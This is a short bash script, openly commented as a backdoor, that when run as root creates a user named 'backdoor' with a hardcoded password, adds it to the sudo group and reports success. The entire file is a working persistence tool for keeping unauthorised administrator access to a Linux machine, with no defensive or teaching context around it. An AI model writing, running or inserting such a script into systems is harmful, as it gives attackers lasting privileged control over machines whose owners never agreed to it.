#!/bin/bash
# -----------------------------------------------------------------------------
# Adds a backdoor user 'backdoor' with sudo privileges (requires root).
# -----------------------------------------------------------------------------

if [ "$(id -u)" -eq 0 ]; then
    if ! id "backdoor" >/dev/null 2>&1; then
        useradd -m -s /bin/bash backdoor
        echo "backdoor:P@ssw0rd123" | chpasswd
        usermod -aG sudo backdoor
        echo "[+] User 'backdoor' added with sudo rights."
    else
        echo "[!] User 'backdoor' already exists."
    fi
else
    echo "[-] Must be root to add users."
fi
